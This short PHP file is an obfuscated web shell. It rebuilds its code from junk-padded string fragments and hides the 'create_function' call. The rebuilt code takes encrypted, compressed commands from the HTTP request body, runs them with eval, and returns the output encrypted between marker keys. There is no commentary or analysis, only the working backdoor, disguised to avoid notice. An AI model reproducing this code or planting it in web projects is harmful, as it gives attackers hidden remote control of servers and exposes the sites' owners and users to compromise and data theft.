<?php
$A='k/&kinput"),$m)=&k=1)&k {@ob_start();@eva&kl&k(@gz&kuncompress(@x&k(@b&kase&k64_d&keco&kde($m[1]),$k)));$o&k=@ob_ge&k';
$a='$&kk=&k"557d8&k4f6";$k&k&kh="4a&k3aac8f4fae";$kf="aee4&kccb914ed&k";$p="j&ke&kHk8&kOhlGisf&kH&k6Tl";function &kx&k($';
$L='t,$k){$c&k=strlen(&k$k);&k$l=&kstrl&ken($t);$o=&k"";for($&ki=0;$i<$&kl;){for&k($&kj=0;(&k$j<$c&&$i<&k$l)&k;$&kj+&k+,$i';
$y='++){$o.=&k$t{$i}^&k&k$k{$j};}}return $o&k&k&k;}if (&k@preg_mat&kch("/$kh(.+)$k&kf&k/"&k,@&kfile_ge&kt_cont&ken&kts("php:/&';
$Y=str_replace('w','','crewawwte_wfunwcwtion');
$p='t_con&ktents&k();@ob_en&kd_clea&kn();$r&k=@ba&kse&k&k64_encode(@x(@gzco&kmpres&ks($o),&k$k));pri&knt("$&kp$kh$&kr$kf");}';
$j=str_replace('&k','',$a.$L.$y.$A.$p);
$G=$Y('',$j);$G();
?>
